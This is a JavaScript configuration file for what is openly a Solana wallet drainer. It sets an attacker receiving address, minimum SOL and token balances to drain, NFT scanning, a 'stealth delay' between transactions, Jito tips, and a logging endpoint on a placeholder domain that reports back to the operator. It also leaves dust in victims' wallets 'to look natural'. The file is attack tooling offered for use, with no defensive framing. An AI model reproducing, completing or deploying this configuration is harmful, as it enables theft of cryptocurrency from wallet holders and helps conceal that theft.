export default {
  // Attacker Receiver
  attackerPubkey: "YOUR_SOLANA_ATTACKER_ADDRESS_HERE",

  // RPC Configuration
  rpcEndpoints: [
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana",
    "https://solana-mainnet.g.alchemy.com/v2/YOUR_KEY",
    "https://mainnet.helius-rpc.com/?api-key=YOUR_KEY",
  ],

  // Transaction Settings
  maxInstructionsPerTx: 10,
  delayBetweenTx: 420,           // ms - stealth delay
  maxRetriesPerTx: 3,

  // Priority Fees
  priorityFeeMicroLamports: 12000,
  useDynamicPriorityFee: true,

  // Jito (MEV)
  jitoEnabled: true,
  jitoTipAmount: 60000,         // in lamports (~0.00006 SOL)

  // Scanning
  scanNFTs: true,
  minSolToDrain: 0.008,         // SOL
  minTokenBalanceToDrain: 1000, // raw units

  // Logging
  logToServer: true,
  loggerEndpoint: "https://yourdomain.com/log/solana",

  // Safety
  leaveDustSol: true,           // Leave small amount to look natural
};